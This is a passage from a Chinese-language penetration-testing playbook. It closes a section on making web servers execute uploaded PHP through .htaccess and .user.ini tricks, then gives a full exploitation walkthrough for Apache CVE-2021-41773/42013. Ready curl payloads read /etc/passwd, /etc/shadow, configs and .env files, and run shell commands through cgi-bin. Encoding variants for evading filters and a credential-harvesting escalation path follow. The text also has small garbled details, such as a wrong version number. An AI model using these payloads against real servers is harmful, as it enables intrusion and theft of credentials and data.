| 现象 | 原因 | 解决 |
| --- | --- | --- |
| .htaccess 访问返回 200 原文 | `AllowOverride None`，配置不生效 | 走 .user.ini 路线 |
| 上传 .htaccess 被拒 | 上传点按扩展名过滤了它 | 改名传（部分应用不查）或用 PUT/编辑器直写 |
| AddType 后访问 500 | 语法错误或 php 处理程序名不对 | 用 `application/x-httpd-php` 全名；查 error.log |
| CGI 返回 500 | mod_cgi 没加载 / 无执行权限 / shebang 缺失 | 确认 `Options +ExecCGI`、shebang、执行权限三点 |
| SetHandler 后全目录乱套 | 影响面过大，非 php 文件也炸 | 改回 AddType 定向到单一扩展名 |
| `.user.ini` 不生效 | PHP 版本 < 5.3 或不是 CGI/FPM 模式 | 换回 .htaccess 或找 PHP 版本漏洞 |

#### 实战要点
- 第一步永远是黑盒探测 `.htaccess` 是否生效（写错语法看会不会 500），别盲打。
- 四件套按鲁棒性排：AddType（.jpg）→ AddType（多扩展名）→ SetHandler（全目录）→ ExecCGI（命令直出）。
- 每次改动 `.htaccess` 后先访问一次看是否 500——500 说明"生效了但语法炸了"，据此修语法而不是怀疑生效性。
- `AllowOverride None` 时立刻切 `.user.ini` + `auto_prepend_file`，它在 PHP 侧生效，绕开 Apache 限制。
- Apache 2.4.49 之后部分 .htaccess 指令被收紧，实战先探测再上载荷；靶场多为 2.4 老配置，四件套基本通用。
- 上传点过滤的是"上传文件名"，`.htaccess` 往往不在黑名单里；先试传再谈绕过。

### [apache-cve-2021-41773] CVE-2021-41773 / CVE-2021-42013 路径穿越 | medium | 路径穿越;CVE;RCE | CVE-2021-41773;CVE-2021-42013
> Apache 2.4.49/2.4.50 的 `..` 规范化缺陷，配合 mod_cgi 直接命令执行。
#### 这个条目的作用
CVE-2021-41773 是 Apache 2.4.49 的一个「路径规范化」缺陷：对 `..` 的校验不完整，攻击者用 `.%2e` 这种"编码过的点"就能骗过检查，实现**任意文件读取**；配合 `mod_cgi`，还能升级成**远程命令执行**（打进 `cgi-bin` 后直接命令回显）。官方补丁（2.4.50）还修得不干净，引出二次编码的 CVE-2021-42013。这是"一个规范化的 bug + 一个不完整的补丁"的连环教材，也是渗透测试里要背的经典 payload 之一。

#### 前置条件
- 目标版本为 Apache **2.4.49**（41773 与 42013 都打）或 **2.4.50**（只打 42013）。
- 用 `curl` 且**必须带 `--path-as-is`**（不带的话 curl 本地就把 `..` 规范化了，payload 发不出去）。
- 判版本：HTTP 响应 `Server` 头常带版本号；无头信息时用「打 41773 payload 是否 200」反推。
- RCE 需要目标加载 `mod_cgi`/`mod_cgid`（LAMP/老环境常见）；没加载就只有 LFI。

#### 第 1 步：确认版本
```bash
curl -i http://target/ | grep -i server
```
预期结果：`Server: Apache/2.4.49 (Unix)` 之类的头部。若版本不显示，直接进入第 2 步——payload 打 200 就证明版本在受影响区间。

#### 第 2 步：LFI（任意文件读取）
```bash
curl --path-as-is "http://target/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
```
预期结果：返回 `/etc/passwd` 全文（200）。解析原理：Apache 的规范化逻辑对 `..` 做了检查，但 `.` 的编码形式 `%2e` 在特定拼接位置逃过了检查，规范化后 `/%2e%2e/%2e%2e/...` 变成 `../../../../etc/passwd` 越出 DocumentRoot。`/icons/` 是默认存在的别名目录，配合它保证请求能进到 alias 拼接逻辑，这是官方 PoC 用它的原因。

如果不行：① 确认 `--path-as-is`；② 确认版本；③ 换 `/cgi-bin/.%2e/...` 变体或调 `..` 层数。

#### 第 3 步：RCE（需要 mod_cgi）——命令回显
```bash
curl --path-as-is -d 'echo;id' "http://target/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
```
预期结果：返回 `uid=33(www-data) gid=33(www-data)` 之类的命令输出。原理：穿越进 `/bin/sh`，mod_cgi 把 POST 体当作命令传给 shell，`echo;id` 里的 `;` 实现「先 echo 输出头 / 再执行 id」的回显技巧。换成任意命令：

```bash
curl --path-as-is -d 'echo;ls -la /' "http://target/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
curl --path-as-is -d 'echo;cat /etc/shadow' "http://target/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
```
如果返回 403/500：八成是没加载 mod_cgi——这条链退化为纯 LFI，改用第 2 步读文件。

#### 第 4 步：二次编码变体（CVE-2021-42013，打 2.4.49 与 2.4.50）
官方给 4.4.49 修 41773 的补丁不完整：`.%2e` 被拦了，但**二次编码的 `%%32%65`**（= `%2e` = `.`）没被拦。

```bash
# LFI 变体
curl --path-as-is "http://target/icons/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd"
# RCE 变体（mod_cgi）
curl --path-as-is -d 'echo;id' "http://target/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh"
```
预期结果：与第 2、3 步相同（726 上 2.4.49 与 2.4.50 都打）。如果第 3 步已被修但第 4 步还通，说明你命中了"补丁不完整"的窗口——这正是 42013 的教科书场景。

#### 第 5 步：修复合集与验证
```bash
# 修复后重放所有 payload，预期全部 4xx（403/400/404）
curl --path-as-is "http://target/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
curl --path-as-is "http://target/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh"
```
官方修复版本：41773 → 2.4.50；42013 → 2.4.51。升级后任意文件读取与命令执行全部关闭。补丁本身的教训：**只修"已知写法"而没修"规范化逻辑"的补丁，一定会被同一思路的下一种编码打穿**——审计时对"编码变体"要系统性地试。
版本条件速查表：
| CVE | 影响版本 | 修复版本 | 无 mod_cgi 时 |
| --- | --- | --- | --- |
| CVE-2021-41773 | 2.4.49 | 2.4.50 | 仅 LFI，可读任意文件 |
| CVE-2021-42013 | 2.4.49、2.4.50 | 2.4.51 | 仅 LFI，可读任意文件 |

#### 第 6 步：无 mod_cgi 时的深入利用（读配置→找凭据）
没有 CGI 也能拿大货：
```bash
# 读 Apache 配置（找 vhost、alias、其他虚拟主机根目录）
curl --path-as-is "http://target/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/apache2/apache2.conf"
# 读站点源码（猜路径）
curl --path-as-is "http://target/icons/.%2e/%2e%2e/%2e%2e/var/www/html/config.php"
# 读环境变量文件
curl --path-as-is "http://target/icons/.%2e/%2e%2e/%2e%2e/var/www/html/.env"
```
预期结果：拿到配置/源码/密钥。LFI 的正确用法是"组合拳"：先读配置确定路径，再读源码找凭据，最后回头试能不能升级成 RCE（比如发现了未被过滤的 CGI 目录或可写点）。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 本地测试不通 | curl 提前把 `..` 规范化了 | 必须加 `--path-as-is` |
| 返回 403 | 版本已修复 / WAF 拦了 `.%2e` | 试二次编码 `%%32%65`；再不行确认版本 |
| RCE payload 403/500 | 目标没加载 mod_cgi / mod_cgid | 退化为 LFI 读文件 |
| 读到了但乱码/被截断 | 二进制文件或目录 | 读文本文件（passwd、conf、php）；`.php` 源码会执行不能直接读元码路径时读备份 |
| `/bin/sh` 执行报错 | 部分环境 `/bin/sh` 是 dash，语法差异 | 换 `-d 'echo;/bin/bash -c id'` 或 `sh -c id` |

#### 实战要点
- 判版本优先看 `Server` 头；看不到就上 payload，`--path-as-is` 打 200 即证实。
- Payload 弹药：`.%2e`（41773）→ `%%32%65`（42013）→ 混合编码；每层换一次编码顺序试。
- `cgi-bin` 变体不加 `icons/` 前缀也一样成立，多试两条路径构造。
- 有 mod_cgi 时 `echo;` 前缀是回显关键——没有它命令输出可能被当 Content-Type 头吃掉。
- 无 mod_cgi 就把 LFI 用满：读配置→读源码→读 `.env`→组合出更高权限利用。
- 修复版本记牢：41773→2.4.50，42013→2.4.51；两个洞本质是同一个"编码绕过规范化"逻辑，编码变体要成体系地试而非双击一次就放弃。